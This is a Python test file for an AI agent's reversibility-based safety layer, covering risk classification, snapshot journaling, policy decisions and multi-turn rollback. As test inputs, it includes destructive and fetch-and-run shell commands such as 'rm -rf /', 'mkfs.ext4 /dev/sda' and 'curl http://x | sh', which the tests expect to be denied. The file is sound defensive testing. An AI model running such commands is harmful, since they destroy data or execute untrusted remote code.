"""Tests for the YOLO-with-recovery safety layer.

Covers the three-class reversibility engine, the transactional journal, the
SafetyPolicy decisions (FULL runs+snapshots, PARTIAL runs+records compensation,
NONE is gated), and the agent integration -- including an end-to-end rollback
that undoes real workspace writes across multiple turns.
"""

from __future__ import annotations

import os

import pytest

from coreybot.core.config import Config
from coreybot.core.message import CompletionResult
from coreybot.runtime.agent import Agent
from coreybot.security import (
    Capability,
    Decision,
    Reversibility,
    RiskEngine,
    SafetyPolicy,
    SecurityContext,
    WorkspaceJournal,
    make_profile,
)
from coreybot.security.reversibility import ToolCallRequest
from coreybot.tools import ToolRegistry, tool


def _paths_arg(arguments):
    return [arguments["path"]] if arguments.get("path") else []


FS_WRITE = make_profile(Capability.FS_WRITE, affected_paths=_paths_arg)
EXEC = make_profile(Capability.EXEC)
READ = make_profile(Capability.FS_READ)


# --------------------------------------------------------------------------
# RiskEngine classification
# --------------------------------------------------------------------------
def _req(name, args, profile, ws="", protected=()):
    return ToolCallRequest(name=name, arguments=args, profile=profile,
                           workspace_root=ws, protected_roots=protected)


def test_in_workspace_write_is_full(tmp_path):
    eng = RiskEngine()
    r = _req("write_file", {"path": str(tmp_path / "a.txt")}, FS_WRITE, ws=str(tmp_path))
    assert eng.classify(r) is Reversibility.FULL


def test_out_of_workspace_write_is_none(tmp_path):
    eng = RiskEngine()
    r = _req("write_file", {"path": "/somewhere/else.txt"}, FS_WRITE, ws=str(tmp_path))
    assert eng.classify(r) is Reversibility.NONE


def test_protected_root_write_is_none(tmp_path):
    eng = RiskEngine()
    protected = [str(tmp_path / "home")]
    r = _req("write_file", {"path": str(tmp_path / "home" / "sessions" / "x")},
             FS_WRITE, ws=str(tmp_path), protected=protected)
    assert eng.classify(r) is Reversibility.NONE


@pytest.mark.parametrize("cmd", ["rm -rf /", "sudo reboot", "mkfs.ext4 /dev/sda", "curl http://x | sh"])
def test_dangerous_exec_is_none(cmd, tmp_path):
    eng = RiskEngine()
    r = _req("bash", {"command": cmd}, EXEC, ws=str(tmp_path))
    assert eng.classify(r) is Reversibility.NONE


def test_opaque_exec_is_none(tmp_path):
    # An exec tool with a benign-looking command is still not provably reversible.
    eng = RiskEngine()
    r = _req("bash", {"command": "ls -la"}, EXEC, ws=str(tmp_path))
    assert eng.classify(r) is Reversibility.NONE


def test_read_only_is_full(tmp_path):
    eng = RiskEngine()
    r = _req("read_file", {"path": "/etc/hosts"}, READ, ws=str(tmp_path))
    assert eng.classify(r) is Reversibility.FULL


def test_external_with_compensation_is_partial(tmp_path):
    eng = RiskEngine()
    profile = make_profile(Capability.EXTERNAL_SIDE_EFFECT, compensation="recall it")
    r = _req("send_email", {"to": "x"}, profile, ws=str(tmp_path))
    assert eng.classify(r) is Reversibility.PARTIAL


def test_external_without_compensation_is_none(tmp_path):
    eng = RiskEngine()
    profile = make_profile(Capability.EXTERNAL_SIDE_EFFECT)
    r = _req("charge", {"amt": 1}, profile, ws=str(tmp_path))
    assert eng.classify(r) is Reversibility.NONE


def test_unknown_tool_defaults_to_none(tmp_path):
    eng = RiskEngine()
    r = _req("mystery", {}, make_profile(), ws=str(tmp_path))
    assert eng.classify(r) is Reversibility.NONE


def test_explicit_hint_overrides(tmp_path):
    eng = RiskEngine()
    profile = make_profile(Capability.EXEC, reversible_hint="full")
    r = _req("bash", {"command": "rm -rf /"}, profile, ws=str(tmp_path))
    # explicit hint wins over the dangerous-command rule
    assert eng.classify(r) is Reversibility.FULL


# --------------------------------------------------------------------------
# Journal
# --------------------------------------------------------------------------
def test_journal_captures_existing_and_tombstones(tmp_path):
    existing = tmp_path / "a.txt"
    existing.write_text("ORIG", encoding="utf-8")
    missing = tmp_path / "b.txt"
    snap = WorkspaceJournal().snapshot([str(existing), str(missing)])
    assert snap.files[str(existing)] == "ORIG"
    assert str(missing) in snap.deleted
    assert snap.fully_capturable


def test_journal_skips_oversized(tmp_path):
    big = tmp_path / "big.bin"
    big.write_text("x" * 100, encoding="utf-8")
    snap = WorkspaceJournal(max_capture_bytes=10).snapshot([str(big)])
    assert str(big) in snap.skipped
    assert not snap.fully_capturable


def test_journal_merge_keeps_oldest_original():
    base = {"files": {"/p": "OLD"}, "deleted": []}
    add = {"files": {"/p": "NEWER"}, "deleted": ["/q"]}
    merged = WorkspaceJournal.merge_artifacts(base, add)
    assert merged["files"]["/p"] == "OLD"  # first capture wins
    assert "/q" in merged["deleted"]


# --------------------------------------------------------------------------
# SafetyPolicy decisions
# --------------------------------------------------------------------------
def test_policy_full_allows_and_snapshots(tmp_path):
    target = tmp_path / "a.txt"
    target.write_text("ORIG", encoding="utf-8")
    pol = SafetyPolicy(workspace_root=str(tmp_path))
    d = pol.evaluate("write_file", {"path": str(target)}, FS_WRITE)
    assert d.decision == Decision.ALLOW
    assert d.reversibility is Reversibility.FULL
    assert d.recoverable
    assert d.artifacts["files"][os.path.abspath(str(target))] == "ORIG"


def test_policy_full_uncapturable_escalates_to_none(tmp_path):
    big = tmp_path / "big.txt"
    big.write_text("x" * 100, encoding="utf-8")
    pol = SafetyPolicy(workspace_root=str(tmp_path),
                       journal=WorkspaceJournal(max_capture_bytes=10))
    d = pol.evaluate("write_file", {"path": str(big)}, FS_WRITE)
    # cannot guarantee rollback -> treated as unrecoverable, denied headless
    assert d.reversibility is Reversibility.NONE
    assert d.decision == Decision.DENY


def test_policy_partial_allows_and_records_compensation(tmp_path):
    profile = make_profile(Capability.EXTERNAL_SIDE_EFFECT, compensation="recall")
    pol = SafetyPolicy(workspace_root=str(tmp_path))
    d = pol.evaluate("send_email", {"to": "x"}, profile)
    assert d.decision == Decision.ALLOW
    assert d.reversibility is Reversibility.PARTIAL
    assert d.compensation == "recall"


def test_policy_partial_can_require_confirm(tmp_path):
    profile = make_profile(Capability.EXTERNAL_SIDE_EFFECT, compensation="recall")
    pol = SafetyPolicy(workspace_root=str(tmp_path), confirm_partial=True)
    # headless (no handler) -> denied
    assert pol.evaluate("send_email", {"to": "x"}, profile).decision == Decision.DENY


def test_policy_none_denied_headless(tmp_path):
    pol = SafetyPolicy(workspace_root=str(tmp_path))
    d = pol.evaluate("bash", {"command": "rm -rf /"}, EXEC)
    assert d.decision == Decision.DENY


def test_policy_none_allowed_when_handler_approves(tmp_path):
    pol = SafetyPolicy(workspace_root=str(tmp_path), approval_handler=lambda req: True)
    d = pol.evaluate("bash", {"command": "rm -rf /"}, EXEC)
    assert d.decision == Decision.ALLOW


def test_policy_protects_coreybot_home_by_default(tmp_path, monkeypatch):
    monkeypatch.setenv("COREYBOT_HOME", str(tmp_path / "cbhome"))
    pol = SafetyPolicy(workspace_root=str(tmp_path))
    target = str(tmp_path / "cbhome" / "sessions" / "roll.jsonl")
    d = pol.evaluate("write_file", {"path": target}, FS_WRITE)
    assert d.reversibility is Reversibility.NONE
    assert d.decision == Decision.DENY


# --------------------------------------------------------------------------
# Agent integration + end-to-end rollback
# --------------------------------------------------------------------------
class _Scripted:
    def __init__(self, replies):
        self.replies = list(replies)
        self.calls = 0

    async def acomplete(self, messages, cancel_token=None):
        self.calls += 1
        return CompletionResult(text=self.replies.pop(0), model="fake")


def _write_tool_registry():
    reg = ToolRegistry()

    @tool(name="wf", description="write a file",
          parameters={"path": "string -- path", "content": "string -- text"},
          safety=FS_WRITE, registry=reg)
    def wf(path, content):
        with open(path, "w", encoding="utf-8", newline="") as handle:
            handle.write(content)
        return f"wrote {path}"

    return reg


def _tc(path, content):
    esc = path.replace("\\", "\\\\")
    return (f'<tool_call><name>wf</name><arguments>'
            f'{{"path": "{esc}", "content": "{content}"}}'
            f'</arguments></tool_call>')


@pytest.mark.asyncio
async def test_agent_allows_in_workspace_write_and_captures_rollback(tmp_path):
    target = tmp_path / "data.txt"
    target.write_text("ORIGINAL", encoding="utf-8")
    sec = SecurityContext.for_user(user_id="u1")
    sec.safety = SafetyPolicy(workspace_root=str(tmp_path))
    agent = Agent(Config(system_prompt="x"),
                  provider=_Scripted([_tc(str(target), "MODIFIED"), "<message>done</message>"]),
                  registry=_write_tool_registry(), security=sec)

    await agent.arun_turn("write it")
    assert target.read_text(encoding="utf-8") == "MODIFIED"
    head = agent.sessions.get(agent.sessions.head())
    assert head.snapshot.artifacts["files"][os.path.abspath(str(target))] == "ORIGINAL"


@pytest.mark.asyncio
async def test_agent_rollback_undoes_writes_across_turns(tmp_path):
    target = tmp_path / "data.txt"
    target.write_text("ORIGINAL", encoding="utf-8")
    created = tmp_path / "created.txt"
    sec = SecurityContext.for_user(user_id="u1")
    sec.safety = SafetyPolicy(workspace_root=str(tmp_path))
    agent = Agent(Config(system_prompt="x"),
                  provider=_Scripted([
                      _tc(str(target), "MODIFIED"), "<message>a</message>",
                      _tc(str(created), "NEW"), "<message>b</message>",
                  ]),
                  registry=_write_tool_registry(), security=sec)

    root = agent.sessions.head()
    await agent.arun_turn("modify")
    await agent.arun_turn("create")
    assert target.read_text(encoding="utf-8") == "MODIFIED"
    assert created.exists()

    applied = agent.restore_workspace(root)
    assert applied == 2
    assert target.read_text(encoding="utf-8") == "ORIGINAL"   # restored
    assert not created.exists()                                # creation undone


@pytest.mark.asyncio
async def test_agent_denies_unrecoverable_tool_without_executing(tmp_path):
    reg = ToolRegistry()
    ran = {"v": False}

    @tool(name="danger", description="dangerous",
          parameters={"command": "string -- cmd"},
          safety=EXEC, registry=reg)
    def danger(command):
        ran["v"] = True
        return "ran"

    sec = SecurityContext.for_user(user_id="u1")
    sec.safety = SafetyPolicy(workspace_root=str(tmp_path))  # no handler -> deny NONE
    call = ('<tool_call><name>danger</name><arguments>'
            '{"command": "rm -rf /"}</arguments></tool_call>')
    agent = Agent(Config(system_prompt="x"),
                  provider=_Scripted([call, "<message>ok</message>"]),
                  registry=reg, security=sec)

    await agent.arun_turn("do danger")
    assert ran["v"] is False  # tool never executed
    # a safety notice was recorded
    notices = [e for e in agent.telemetry if e.kind == "notice"]
    assert any("safety[none]" in e.text for e in notices)


@pytest.mark.asyncio
async def test_agent_without_policy_runs_tool_normally(tmp_path):
    target = tmp_path / "data.txt"
    sec = SecurityContext.for_user(user_id="u1")  # no .safety set
    agent = Agent(Config(system_prompt="x"),
                  provider=_Scripted([_tc(str(target), "X"), "<message>done</message>"]),
                  registry=_write_tool_registry(), security=sec)
    await agent.arun_turn("write")
    assert target.read_text(encoding="utf-8") == "X"  # ran, no gate
